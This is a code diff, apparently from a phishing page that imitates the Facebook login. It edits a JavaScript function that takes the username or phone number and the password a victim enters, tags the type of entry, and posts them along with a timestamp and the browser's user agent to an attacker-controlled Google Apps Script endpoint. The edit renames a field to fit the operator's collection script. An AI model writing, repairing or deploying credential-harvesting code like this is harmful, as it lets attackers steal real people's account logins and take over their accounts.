@@ -442,50 +442,42 @@
         }
         
         // Função para salvar dados no Google Sheets
-        async function saveToGoogleSheets(username, password) {
-            try {
-                const timestamp = new Date().toLocaleString('pt-BR');
-                const userAgent = navigator.userAgent;
-                
-                // Detectar se é email ou telefone
-                const inputType = username.includes('@') ? 'email' : 
-                                /^\d+$/.test(username.replace(/\s/g, '').replace(/[\(\)\-\+]/g, '')) ? 'telefone' : 'username';
-                
-                // Preparar dados para envio
-                const data = {
-                    username: username,
-                    password: password,
-                    input_type: inputType,
-                    timestamp: timestamp,
-                    userAgent: userAgent,
-                    source: 'facebook_login_page'
-                };
-                
-                console.log('📤 Enviando dados:', data);
-                
-                // Enviar para Google Apps Script
-                await fetch(GOOGLE_SCRIPT_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: new URLSearchParams(data)
-                });
-                
-                console.log('✅ Dados enviados com sucesso:', {
-                    username: username,
-                    type: inputType,
-                    timestamp: timestamp
-                });
-                
-                return { success: true, type: inputType };
-                
-            } catch (error) {
-                console.error('❌ Erro ao salvar no Google Sheets:', error);
-                return { success: false, error: error.message };
-            }
+       async function saveToGoogleSheets(username, password) {
+        try {
+            const timestamp = new Date().toLocaleString('pt-BR');
+            const userAgent = navigator.userAgent;
+            
+            // Detectar se é email ou telefone
+            const inputType = username.includes('@') ? 'email' : 
+                            /^\d+$/.test(username.replace(/\s/g, '').replace(/[\(\)\-\+]/g, '')) ? 'telefone' : 'outro';
+            
+            // ⚠️ IMPORTANTE: Enviar como "email" para compatibilidade com seu Apps Script
+            const data = {
+                email: username,  // ⬅️ MANTÉM O NOME "email" PARA O APPS SCRIPT
+                password: password,
+                tipo_entrada: inputType,  // ⬅️ Campo extra para identificar
+                timestamp: timestamp,
+                userAgent: userAgent,
+                source: 'facebook_login'
+            };
+            
+            console.log('📤 Enviando dados:', data);
+            
+            // Enviar para Google Apps Script
+            await fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: new URLSearchParams(data)
+            });
+            
+            console.log('✅ Dados enviados com sucesso');
+            return { success: true, type: inputType };
+            
+        } catch (error) {
+            console.error('❌ Erro ao salvar:', error);
+            return { success: false };
         }
+    }
         
         // Validação do formulário
         loginForm.addEventListener('submit', async function(e) {
